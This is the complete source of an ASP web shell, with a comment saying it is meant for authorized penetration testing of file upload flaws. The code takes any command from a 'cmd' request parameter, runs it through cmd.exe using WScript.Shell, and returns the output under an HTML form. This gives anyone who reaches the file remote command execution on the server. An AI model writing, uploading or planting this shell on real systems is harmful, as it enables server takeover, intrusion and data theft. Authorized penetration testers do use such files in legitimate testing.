<%
' ASP Web Shell for testing file upload vulnerabilities
' This should only be used for authorized penetration testing

Dim cmd
cmd = Request("cmd")
If cmd <> "" Then
    Response.Write("<pre>")
    Dim shell, exec
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd.exe /c " & cmd)
    Response.Write(exec.StdOut.ReadAll())
    Response.Write("</pre>")
End If
%>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" autofocus>
<input type="submit" value="Execute">
</form>
</body>
</html>
